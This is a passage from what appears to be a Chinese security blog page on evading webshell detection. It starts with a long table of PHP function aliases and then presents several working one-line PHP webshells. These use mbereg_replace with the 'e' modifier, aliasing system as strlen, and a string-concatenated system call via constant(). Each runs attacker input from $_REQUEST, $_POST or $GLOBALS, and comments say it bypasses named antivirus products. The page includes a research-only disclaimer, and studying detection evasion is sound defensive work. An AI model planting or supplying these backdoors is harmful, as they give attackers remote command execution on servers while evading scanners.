+num_rows-&gt;mysqli_stmt_num_rows
+send_long_data-&gt;mysqli_stmt_send_long_data
+free_result-&gt;mysqli_stmt_free_result
+reset-&gt;mysqli_stmt_reset
+prepare-&gt;mysqli_stmt_prepare
+store_result-&gt;mysqli_stmt_store_result
+get_result-&gt;mysqli_stmt_get_result
+oci_free_cursor-&gt;oci_free_statement
+ocifreecursor-&gt;oci_free_statement
+ocibindbyname-&gt;oci_bind_by_name
+ocidefinebyname-&gt;oci_define_by_name
+ocicolumnisnull-&gt;oci_field_is_null
+ocicolumnname-&gt;oci_field_name
+ocicolumnsize-&gt;oci_field_size
+ocicolumnscale-&gt;oci_field_scale
+ocicolumnprecision-&gt;oci_field_precision
+ocicolumntype-&gt;oci_field_type
+ocicolumntyperaw-&gt;oci_field_type_raw
+ociexecute-&gt;oci_execute
+ocicancel-&gt;oci_cancel
+ocifetch-&gt;oci_fetch
+ocifetchstatement-&gt;oci_fetch_all
+ocifreestatement-&gt;oci_free_statement
+ociinternaldebug-&gt;oci_internal_debug
+ocinumcols-&gt;oci_num_fields
+ociparse-&gt;oci_parse
+ocinewcursor-&gt;oci_new_cursor
+ociresult-&gt;oci_result
+ociserverversion-&gt;oci_server_version
+ocistatementtype-&gt;oci_statement_type
+ocirowcount-&gt;oci_num_rows
+ocilogoff-&gt;oci_close
+ocilogon-&gt;oci_connect
+ocinlogon-&gt;oci_new_connect
+ociplogon-&gt;oci_pconnect
+ocierror-&gt;oci_error
+ocifreedesc-&gt;oci_free_descriptor
+ocisavelob-&gt;oci_lob_save
+ocisavelobfile-&gt;oci_lob_import
+ociwritelobtofile-&gt;oci_lob_export
+ociloadlob-&gt;oci_lob_load
+ocicommit-&gt;oci_commit
+ocirollback-&gt;oci_rollback
+ocinewdescriptor-&gt;oci_new_descriptor
+ocisetprefetch-&gt;oci_set_prefetch
+ocipasswordchange-&gt;oci_password_change
+ocifreecollection-&gt;oci_free_collection
+ocinewcollection-&gt;oci_new_collection
+ocicollappend-&gt;oci_collection_append
+ocicollgetelem-&gt;oci_collection_element_get
+ocicollassignelem-&gt;oci_collection_element_assign
+ocicollsize-&gt;oci_collection_size
+ocicollmax-&gt;oci_collection_max
+ocicolltrim-&gt;oci_collection_trim
+load-&gt;oci_lob_load
+tell-&gt;oci_lob_tell
+truncate-&gt;oci_lob_truncate
+erase-&gt;oci_lob_erase
+flush-&gt;oci_lob_flush
+setbuffering-&gt;ocisetbufferinglob
+getbuffering-&gt;ocigetbufferinglob
+rewind-&gt;oci_lob_rewind
+read-&gt;oci_lob_read
+eof-&gt;oci_lob_eof
+seek-&gt;oci_lob_seek
+write-&gt;oci_lob_write
+append-&gt;oci_lob_append
+size-&gt;oci_lob_size
+writetofile-&gt;oci_lob_export
+export-&gt;oci_lob_export
+import-&gt;oci_lob_import
+writetemporary-&gt;oci_lob_write_temporary
+close-&gt;oci_lob_close
+save-&gt;oci_lob_save
+savefile-&gt;oci_lob_import
+free-&gt;oci_free_descriptor
+append-&gt;oci_collection_append
+getelem-&gt;oci_collection_element_get
+assignelem-&gt;oci_collection_element_assign
+assign-&gt;oci_collection_assign
+size-&gt;oci_collection_size
+max-&gt;oci_collection_max
+trim-&gt;oci_collection_trim
+free-&gt;oci_free_collection
+odbc_do-&gt;odbc_exec
+odbc_field_precision-&gt;odbc_field_len
+openssl_free_key-&gt;openssl_pkey_free
+openssl_get_privatekey-&gt;openssl_pkey_get_private
+openssl_get_publickey-&gt;openssl_pkey_get_public
+pcntl_errno-&gt;pcntl_get_last_error
+pg_exec-&gt;pg_query
+pg_getlastoid-&gt;pg_last_oid
+pg_cmdtuples-&gt;pg_affected_rows
+pg_errormessage-&gt;pg_last_error
+pg_numrows-&gt;pg_num_rows
+pg_numfields-&gt;pg_num_fields
+pg_fieldname-&gt;pg_field_name
+pg_fieldsize-&gt;pg_field_size
+pg_fieldtype-&gt;pg_field_type
+pg_fieldnum-&gt;pg_field_num
+pg_fieldprtlen-&gt;pg_field_prtlen
+pg_fieldisnull-&gt;pg_field_is_null
+pg_freeresult-&gt;pg_free_result
+pg_result-&gt;pg_fetch_result
+pg_loreadall-&gt;pg_lo_read_all
+pg_locreate-&gt;pg_lo_create
+pg_lounlink-&gt;pg_lo_unlink
+pg_loopen-&gt;pg_lo_open
+pg_loclose-&gt;pg_lo_close
+pg_loread-&gt;pg_lo_read
+pg_lowrite-&gt;pg_lo_write
+pg_loimport-&gt;pg_lo_import
+pg_loexport-&gt;pg_lo_export
+pg_clientencoding-&gt;pg_client_encoding
+pg_setclientencoding-&gt;pg_set_client_encoding
+pg_clientencoding-&gt;pg_client_encoding
+pg_setclientencoding-&gt;pg_set_client_encoding
+posix_errno-&gt;posix_get_last_error
+session_commit-&gt;session_write_close
+snmpwalkoid-&gt;snmprealwalk
+snmp_set_oid_numeric_print-&gt;snmp_set_oid_output_format
+socket_getopt-&gt;socket_get_option
+socket_setopt-&gt;socket_set_option
+sodium_crypto_scalarmult_base-&gt;sodium_crypto_box_publickey_from_secretkey
+join-&gt;implode
+chop-&gt;rtrim
+strchr-&gt;strstr
+srand-&gt;mt_srand
+getrandmax-&gt;mt_getrandmax
+show_source-&gt;highlight_file
+ini_alter-&gt;ini_set
+checkdnsrr-&gt;dns_check_record
+getmxrr-&gt;dns_get_mx
+doubleval-&gt;floatval
+is_integer-&gt;is_int
+is_long-&gt;is_int
+is_double-&gt;is_float
+fputs-&gt;fwrite
+set_file_buffer-&gt;stream_set_write_buffer
+socket_set_blocking-&gt;stream_set_blocking
+stream_register_wrapper-&gt;stream_wrapper_register
+stream_register_wrapper-&gt;stream_wrapper_register
+socket_set_timeout-&gt;stream_set_timeout
+dir-&gt;getdir
+is_writeable-&gt;is_writable
+diskfreespace-&gt;disk_free_space
+pos-&gt;current
+sizeof-&gt;count
+key_exists-&gt;array_key_exists
+close-&gt;closedir
+rewind-&gt;rewinddir
+importStylesheet-&gt;xsl_xsltprocessor_import_stylesheet
+transformToDoc-&gt;xsl_xsltprocessor_transform_to_doc
+transformToUri-&gt;xsl_xsltprocessor_transform_to_uri
+transformToXml-&gt;xsl_xsltprocessor_transform_to_xml
+setParameter-&gt;xsl_xsltprocessor_set_parameter
+getParameter-&gt;xsl_xsltprocessor_get_parameter
+removeParameter-&gt;xsl_xsltprocessor_remove_parameter
+hasExsltSupport-&gt;xsl_xsltprocessor_has_exslt_support
+registerPHPFunctions-&gt;xsl_xsltprocessor_register_php_functions
+setProfiling-&gt;xsl_xsltprocessor_set_profiling
+setSecurityPrefs-&gt;xsl_xsltprocessor_set_security_prefs
+getSecurityPrefs-&gt;xsl_xsltprocessor_get_security_prefs
+gzrewind-&gt;rewind
+gzclose-&gt;fclose
+gzeof-&gt;feof
+gzgetc-&gt;fgetc
+gzgets-&gt;fgets
+DEP_FALIAS(gzgetss-&gt;fgetss
+gzread-&gt;fread
+gzpassthru-&gt;fpassthru
+gzseek-&gt;fseek
+gztell-&gt;ftell
+gzwrite-&gt;fwrite
+gzputs-&gt;fwrite
+getallheaders-&gt;apache_request_headers
+getallheaders-&gt;litespeed_request_headers
+apache_request_headers-&gt;litespeed_request_headers
+apache_response_headers-&gt;litespeed_response_headers
+</code></pre></div>
+<p>这里附的表不包含被弃用的(会有PHP警告,但仍可用),而在这些别名中,我们就可以找到可以利用的函数mbereg<em>replace,这个函数是mb</em>ereg<em>replace的别名,mb</em>ereg<em>replace与preg</em>replace类似,可以利用e模式隐式执行代码,但是mb<em>ereg</em>replace无法逃过查杀,而mbereg<em>replace则是ALLKILL,没错,只是一个</em>的差别,让他逃过了免杀的眼睛</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>  
+<span class="c1">// (ALLKILL)</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nx">mbereg_replace</span><span class="p">(</span><span class="s1">&#39;.*&#39;</span><span class="p">,</span> <span class="s1">&#39;\0&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">2333</span><span class="p">],</span> <span class="s1">&#39;mer&#39;</span><span class="p">);</span><span class="c1">//php5 php7 success</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>另外,我们可以自己创造别名,如:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>  
+<span class="c1">// PHP &gt;=5.6 可过盾狗</span>
+<span class="k">use</span> <span class="k">function</span> <span class="nf">\system</span> <span class="k">as</span> <span class="nb">strlen</span><span class="p">;</span>  <span class="c1">// 配合文件包含这甚至可以实现劫持,留待你们开发</span>
+<span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="c1">// (ALLKILL)</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">&quot;ARRAY2&quot;</span><span class="p">,</span> <span class="s2">&quot;sys&quot;</span><span class="o">.</span><span class="s2">&quot;tem&quot;</span><span class="p">);</span>
+<span class="o">@</span><span class="nb">constant</span><span class="p">(</span><span class="s2">&quot;ARRAY2&quot;</span><span class="p">)(</span><span class="nb">pos</span><span class="p">(</span><span class="nb">pos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">)));</span>  <span class="c1">// PHP&gt;7</span>
+</code></pre></div>
+<p><strong>免责声明:</strong></p>
+<ol>
+<li>
+<p><strong>在对方未授权的情况下，直接或间接利用本项目涉及到的 webshell 研究样本攻击目标是违法行为.</strong></p>
+</li>
+<li>
+<p><strong>本项目涉及到的 webshell 仅为安全研究和授权情况下使用，其使用人员有责任和义务遵守当地法律条规.</strong></p>
+</li>
+<li>
+<p><strong>本项目涉及到的 webshell 样本及文章仅为促进安全防御研究使用，研究人员对因误用该程序造成的资产损坏和损失概不负责.</strong></p>
+</li>
+</ol>
+                
+                  
+                
+              
+  
+
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" title="Back to top" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+          </a>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+    <div class="md-footer-copyright">
+        
+        
+    </div>
+    
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/WAY29" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+      <a href="mailto:toloveu29@gmail.com" target="_blank" rel="noopener" title="" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M1.75 3A1.75 1.75 0 0 0 0 4.75v14c0 .966.784 1.75 1.75 1.75h20.5A1.75 1.75 0 0 0 24 18.75v-14A1.75 1.75 0 0 0 22.25 3H1.75zM1.5 4.75a.25.25 0 0 1 .25-.25h20.5a.25.25 0 0 1 .25.25v.852l-10.36 7a.25.25 0 0 1-.28 0l-10.36-7V4.75zm0 2.662V18.75c0 .138.112.25.25.25h20.5a.25.25 0 0 0 .25-.25V7.412l-9.52 6.433c-.592.4-1.368.4-1.96 0L1.5 7.412z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://longlone.best/rss.xml" target="_blank" rel="noopener" title="longlone.best" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M3.5 3.25a.75.75 0 0 1 .75-.75C14.053 2.5 22 10.447 22 20.25a.75.75 0 0 1-1.5 0C20.5 11.275 13.225 4 4.25 4a.75.75 0 0 1-.75-.75zM3.5 19a2 2 0 1 1 4 0 2 2 0 0 1-4 0zm.75-9.5a.75.75 0 0 0 0 1.5 9.25 9.25 0 0 1 9.25 9.25.75.75 0 0 0 1.5 0C15 14.313 10.187 9.5 4.25 9.5z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+</div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.expand", "navigation.top", "toc.integrate", "tabs"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}, "search": "../../../assets/javascripts/workers/search.d351de03.min.js", "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.34eae1b6.min.js"></script>
+      
+        <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
